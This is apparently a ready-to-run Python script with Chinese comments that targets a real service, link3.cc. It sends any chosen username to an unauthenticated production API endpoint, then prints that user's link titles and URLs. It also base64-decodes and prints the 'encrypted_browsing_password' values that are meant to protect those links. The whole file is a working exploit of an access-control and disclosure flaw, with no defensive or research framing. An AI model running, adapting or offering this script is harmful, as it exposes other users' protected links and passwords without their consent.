import base64
import json
import sys
import os
import requests
import platform  # 导入platform模块以检测操作系统

# 跨平台清屏函数
def clear_screen():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')

# 调用清屏函数以测试是否生效（可选）
clear_screen()

# 获取用户输入的用户名
username = input("请输入用户名: ")

TARGET_URL = "https://v2.api.production.link3.cc:5675/api/no_auth/user"
POST_JSON = {"username": username}

try:
    # 发送POST请求
    resp = requests.post(TARGET_URL, json=POST_JSON)
    resp.raise_for_status()  # 如果响应状态码不是200，将引发HTTPError异常

    # 解析响应数据
    data = resp.json()
    links = json.loads(data['data']['links'])

    # 用于存储美化后的信息和密码
    beautified_info = []
    passwords = []

    for l in links:
        type_value = l.get('typeValue', {})

        title = type_value.get('title')
        nav_url = type_value.get('nav_url')
        pwd_encrypted = type_value.get('encrypted_browsing_password')

        # 构造美化后的信息（不包含"Title："前缀）
        if title and nav_url:
            beautified_info.append(f"{title} | {nav_url}")
        elif title:
            beautified_info.append(title)
        elif nav_url:
            beautified_info.append(nav_url)

        # 收集密码（如果存在）
        if pwd_encrypted:
            passwords.append(base64.b64decode(pwd_encrypted).decode())

    # 打印美化后的信息
    for info in beautified_info:
        print(info)

    # 打印密码（如果有多个密码，分别打印出“密码1”、“密码2”等）
    if passwords:
        for idx, pwd in enumerate(passwords, start=1):
            print(f"密码{idx}: {pwd}")
except requests.exceptions.HTTPError as http_err:
    print(f"HTTP error occurred: {http_err}")
except json.JSONDecodeError:
    print("Error decoding JSON response")
except Exception as err:
    print(f"An error occurred: {err}")